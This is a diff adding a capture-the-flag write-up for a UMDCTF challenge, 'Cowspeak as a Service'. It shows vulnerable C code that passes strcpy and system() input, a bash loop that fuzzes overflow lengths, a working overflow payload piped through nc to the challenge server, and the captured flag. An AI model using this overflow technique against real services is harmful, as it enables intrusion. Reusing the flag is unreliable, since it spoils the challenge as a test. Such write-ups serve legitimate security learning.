@@ -68,3 +68,78 @@ Nope!
 UMDCTF-{s0me_questions_h4ve_answ3rs}
 ```
 
+## Cowspeak as a Service
+lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old messages... Can you become chief cow and read the first message?
+
+nc 192.241.138.174 9998
+
+This one I struggleed with for a bit.  Probably my first real struggle of the CTF.  Luckily the *main.c* file is provided and in it I noticed that use of *strcpy.
+
+```
+void moo(char *msg)
+{
+        char speak[64];
+        int chief_cow = 1;
+
+        strcpy(speak, msg);
+        printf("Value of chief_cow: %d\n", chief_cow);
+        speak[strcspn(speak, "\r\n")] = 0;
+        setenv("MSG", speak, chief_cow);
+
+        system("./cowsay $MSG");
+
+}
+```
+
+I compiled the binary and played around with overflowing *speak* but couldn't seem to affect its call to cowsay.  I took a second to think about what it was that I was trying to accomplish.  I then honed in on the use of *setenv*. The man page for this function indicates:
+
+```
+int setenv(const char *name, const char *value, int overwrite);
+...
+if overwrite is zero, then the value of name is not changed
+```
+
+So, that's what I need to do.  I need to overlow and change the value of chief_cow to zero.  However, its not in the correct place on the stack where an overflow of speak can affect it.  Thats when I realize that I didn't compile with **-fno-stack-protector** which is a must for most of these easier overflow problems.  I recompile and notice I can now adjust the value of chief_cow if I overflow.  I modify the *main.c* code to print out the value of *chief_cow* so that I can see its value as I attempt to exploit it.  I then put togethr a pretty crappy for loop to loop through and inspect the results.
+
+```
+for i in {64..80}; do echo $i; python -c "print('a'*"$i" + '\x00'*4)" | ./cow; done
+```
+
+Looking over the results I can see that 76 characters overflowed and updated the value of *chief_cow*.
+
+```
+76
+Welcome to Cowsay as a Service (CaaS)!
+
+Enter your message:
+
+Value of chief_cow: 0
+ _________________________________________
+/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \
+\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   /
+ -----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+```
+
+I attempt this against the server:
+
+```
+↳ $ python -c "print('a'*76 + '\x00'*4)" | nc 192.241.138.174 9998
+Welcome to Cowsay as a Service (CaaS)!
+
+Enter your message:
+
+ ________________________
+< UMDCTF-{P5Th_Ov3rF10w} >
+ ------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+```
+
